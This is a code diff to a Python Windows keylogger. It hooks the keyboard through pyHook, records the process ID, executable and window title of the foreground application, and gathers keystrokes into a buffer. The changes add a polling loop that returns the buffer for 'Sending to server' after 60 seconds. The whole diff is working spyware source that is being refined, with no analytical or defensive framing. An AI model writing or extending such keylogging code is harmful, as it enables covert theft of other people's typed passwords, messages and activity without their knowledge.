@@ -14,6 +14,7 @@ key_buffer = []
 start_time = time.clock() #program time
 
 def get_current_process():
+    global key_buffer
     #get a handle for forground window
     hwnd= user32.GetForegroundWindow()
     
@@ -36,9 +37,10 @@ def get_current_process():
     
     #print out the header if we're in the right process
     print
-    print "[PID: %s - %s - %s]" %(process_id, executable.value, window_title.value)
+    temp = "[PID: %s - %s - %s]" %(process_id, executable.value, window_title.value)
+    print temp
     print
-    
+    key_buffer.append(temp)
     #close handles
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
@@ -86,9 +88,10 @@ def run():
     k1.KeyDown=KeyStroke
     #register the hook and execute forever
     k1.HookKeyboard()
-    if time.clock()-start_time >60:
-        print"Sending to server"                
-        return key_buffer   
-    pythoncom.PumpMessages()
+    while True:
+        if time.clock()-start_time >60:
+            print"Sending to server"                
+            return key_buffer   
+        pythoncom.PumpWaitingMessages()
     
     #return key_buffer
